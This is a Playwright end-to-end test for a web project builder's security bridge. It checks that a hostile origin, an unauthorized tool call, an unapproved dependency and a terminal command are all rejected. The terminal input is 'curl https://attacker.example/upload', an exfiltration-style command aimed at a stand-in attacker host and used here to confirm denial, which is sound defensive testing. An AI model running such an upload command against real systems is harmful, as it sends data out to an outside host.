import { expect, test } from "@playwright/test";

test("il bridge rifiuta origine, dipendenza e mutazione non autorizzate", async ({ page, request }) => {
  await page.goto("/");
  await page.getByLabel("Project name").fill(`Security proof ${Date.now()}`);
  await page.getByRole("button", { name: "Blank project Start with a clean canvas" }).click();
  const projectId = await page.locator(".app-shell").getAttribute("data-project-id");

  const hostileOrigin = await request.get("/api/live/status", { headers: { origin: "https://attacker.example" } });
  expect(hostileOrigin.status()).toBe(403);

  const unauthorized = await request.post("/api/live/tools/open_preview", {
    data: { projectId, pageId: "none", revision: 0, args: {} },
  });
  expect(unauthorized.status()).toBe(401);

  const dependency = await page.evaluate(async (id) => {
    const response = await fetch("/api/android/prepare", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        projectId: id,
        files: {
          "package.json": JSON.stringify({ dependencies: { "@unknown/host-access": "^1.0.0" } }),
          "index.html": "<!doctype html>",
        },
        dependencyApprovals: [],
      }),
    });
    return { status: response.status, body: await response.json() };
  }, projectId);
  expect(dependency.status).toBe(403);
  expect(dependency.body.error).toContain("exact reviewed approval");

  await page.getByRole("button", { name: "Terminal" }).click();
  await page.getByLabel("Command", { exact: true }).fill("curl https://attacker.example/upload");
  await page.getByRole("button", { name: "Run" }).click();
  await expect(page.getByRole("alert")).toContainText("not allowed");
  await page.screenshot({ path: "artifacts/security-policy-denial.png", fullPage: true });
});
